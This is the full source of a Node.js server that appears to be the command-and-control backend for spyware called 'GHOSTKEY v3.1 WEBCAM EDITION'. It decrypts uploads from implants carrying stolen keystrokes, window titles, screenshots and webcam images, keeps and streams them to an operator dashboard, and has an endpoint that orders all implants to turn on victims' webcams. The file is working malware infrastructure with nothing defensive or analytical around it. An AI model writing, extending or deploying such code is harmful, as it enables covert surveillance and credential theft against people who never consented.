const express = require('express');
const CryptoJS = require('crypto-js');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const AES_KEY = "x93mK!qWeR7zL9p&2vN8bT5cY4fU6jH0";

app.use(cors());
app.use(bodyParser.json({ limit: '30mb' }));
app.use(bodyParser.urlencoded({ limit: '30mb', extended: true }));
app.use(express.static('public'));

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

let clients = [];
let history = [];

// SSE
app.get('/events', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('X-Accel-Buffering', 'no');
  res.flushHeaders();
  res.write(': connected\n\n');
  clients.push(res);
  history.forEach(e => res.write(`data: ${JSON.stringify(e)}\n\n`));
  req.on('close', () => { clients = clients.filter(c => c !== res); });
});

// WEBCAM COMMAND — click button → triggers all implants
app.get('/cmd/webcam', (req, res) => {
  broadcast({ type: "webcam_request" });
  res.json({ success: true });
});

app.get('/history', (req, res) => res.json(history));

function broadcast(data) {
  const msg = JSON.stringify(data);
  clients.forEach(c => { try { c.write(`data: ${msg}\n\n`); } catch {} });
}

function decrypt(b64) {
  try {
    const data = CryptoJS.enc.Base64.parse(b64);
    const iv = data.clone(); iv.sigBytes = 16; iv.clamp();
    const ct = data.clone(); ct.words.splice(0,4); ct.sigBytes -= 16;
    const dec = CryptoJS.AES.decrypt({ciphertext: ct}, CryptoJS.enc.Utf8.parse(AES_KEY), {
      iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7
    });
    return JSON.parse(dec.toString(CryptoJS.enc.Utf8));
  } catch (e) { console.log("Decrypt failed"); return null; }
}

app.post('/ghost', (req, res) => {
  const p = decrypt(req.body.data);
  if (p) {
    p.timestamp = new Date().toISOString();
    history.push(p); if (history.length > 1000) history.shift();
    console.log(`[+] ${p.Client} | ${p.Window} | ${p.Keys?.length||0} keys${p.Screenshot?' + SS':''}${p.Webcam?' + WEBCAM':''}`);
    broadcast(p);
  }
  res.json({ success: true });
});

setInterval(() => clients.forEach(c => { try { c.write(': ping\n\n'); } catch {} }), 15000);

app.listen(PORT, () => console.log(`GHOSTKEY v3.1 WEBCAM EDITION LIVE`));